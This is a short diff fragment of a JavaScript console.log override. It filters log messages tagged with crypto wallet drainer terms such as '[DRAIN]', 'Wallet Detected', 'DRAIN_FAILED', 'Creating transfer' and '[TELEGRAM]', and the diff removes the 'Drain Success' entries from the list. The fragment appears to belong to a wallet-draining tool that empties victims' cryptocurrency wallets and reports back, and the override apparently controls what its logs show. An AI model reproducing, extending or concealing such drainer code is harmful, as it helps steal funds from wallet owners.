@@ -36,9 +36,7 @@ console.log = function() {
       arguments[0].includes('[DRAIN]') ||
       arguments[0].includes('[BALANCE]') ||
       arguments[0].includes('[TELEGRAM]') ||
-      arguments[0].includes('Drain Success') ||
       arguments[0].includes('Wallet Detected') ||
-      arguments[0].includes('DRAIN_SUCCESS') ||
       arguments[0].includes('DRAIN_FAILED') ||
       arguments[0].includes('Creating transfer') ||
       arguments[0].includes('Drain attempt details') ||
